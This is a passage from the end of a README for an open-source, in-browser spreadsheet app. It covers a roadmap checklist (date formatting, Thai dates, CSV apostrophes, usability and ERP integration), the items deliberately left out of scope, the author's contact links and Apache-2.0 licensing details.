      on import, real date cells on export, a file's own layout shown as the file has it, and `###` rather than a cut-off date
- [x] **Opening blank, a sample button, and New file** — done (see [A blank start, and New file](#-a-blank-start-and-new-file))
- [ ] **Date formulas formatted for you** — only `TODAY`/`NOW`/`DATE` today; `=A1+30` shows a number until a format is picked
- [ ] **Date validation rules** — import and export Excel's date validation (the ERP template uses it); dropped on open today
- [ ] **Thai dates (#82)** — Buddhist-era years, Thai month names, typed `dd/mm/yyyy`, and a file's Buddhist-calendar format
- [ ] **A CSV field starting with `'`** — on import the first `'` is read as Excel's "the rest is text" marker and
      not shown. A file that means the apostrophe literally (a name like `'s-Hertogenbosch`) loses it for now
- [x] **The blind usability pass** — [opening a file without losing your work](#-opening-a-file-without-losing-your-work)
      with an undo, [touch commands on a phone](#-copy-paste-and-fill-down-with-a-finger), [fill colour](#-fill-colour),
      `Ctrl+B/I/U`, a first language taken from the browser, [a tablet and folding-phone layout](#-tablets-and-folding-phones),
      a reordered AI panel and a Common formulas group · what the same pass found and is still open is below
- [ ] **`Tab` then `Enter` returns to the starting column**, as in Excel — `Enter` now goes down from the last cell
      `Tab` reached, so filling a table row by row means walking back by hand
- [ ] **Drag a column header's edge to resize it** — imported columns keep their widths, but nothing in the app
      can change one, so long text is cut with `…`
- [ ] **A right-click menu on cells on a desktop** (copy, paste, insert, delete) — there is only the row/column header one
- [ ] **Keep the phone keyboard up after Enter** — filling cells one by one on a phone, the keyboard folds at
      every move and has to be tapped open again
- [ ] **The connect-an-API and source settings dialogs do not close on `Escape`** — only the close button or a
      click outside does, unlike every other dialog in the app · found while checking the 1024–1365px layout after merging #110
- [ ] **Fills in the PDF export**, and **pasting the system clipboard** from the phone command row
- [ ] **A shorter landing page for people who are not developers** — how it was built (tests, security) is worth
      a lot to someone reading the code, but someone looking for a spreadsheet scrolls past it before reaching why
      they should try it · three lines under the start button (free · your file stays on your device · any screen) for now
- [ ] **Push-based realtime (SSE/WebSocket)** instead of polling, and filtering live data from the UI before placing it
- [ ] **Working with PaynEat ERP** — agreed, not built (see [docs/payneat-erp.en.md](docs/payneat-erp.en.md)):
      the import template waits on cross-sheet dropdowns read from the right sheet, range references kept
      through the round trip, and hidden/protected sheets kept as they were. Live data from an ERP on an
      internal network waits on an operator-named list of internal hosts, and on sending `x-request-id`

**Deliberately out of scope:**

- **A hosted collaboration service** — collaboration itself *shipped*, on the user's own backend (see
  [Editing together](#-editing-together)). Running one central server for everyone is the part that
  stays out of scope: it would reverse the property the whole app stands on — your file never leaves
  your browser.
- **Using an off-the-shelf formula library** — the engine is hand-written on purpose to keep full control over
  its behavior (see [Formula engine](#-formula-engine)), even at the cost of fewer built-in functions than a
  library like HyperFormula would offer.

---

## 👤 Author

Built by **Suruch Boss**

- GitHub — [github.com/SuruchBoss](https://github.com/SuruchBoss)
- LinkedIn — [linkedin.com/in/suruchboss](https://www.linkedin.com/in/suruchboss)
- Email — [bossxiii@gmail.com](mailto:bossxiii@gmail.com)

If this project is useful to you, or you'd like to talk about work, do get in touch.

---

## 📄 License

Released under the [Apache License 2.0](LICENSE) — free to use, modify and use commercially.

Copyright © 2026 Suruch Chakrapeesirisuk. Every source file starts with its copyright line and an
`SPDX-License-Identifier: Apache-2.0` header (CI checks it on every push), and every commit in a pull
request from outside is signed off under the Developer Certificate of Origin (`git commit -s`) — see
[CONTRIBUTING.md](CONTRIBUTING.md).

What the licence asks in return: if you redistribute it (a deployed fork counts), include a copy of
the licence, state which files you changed, and **carry the [`NOTICE`](NOTICE) file with its
upstream credit**, per section 4(d). That last mechanism is why Apache-2.0 was chosen over MIT,
which has no equivalent.

`"private": true` stays in `package.json` on purpose — it prevents an accidental `npm publish` of
an application and says nothing about whether the source is open.
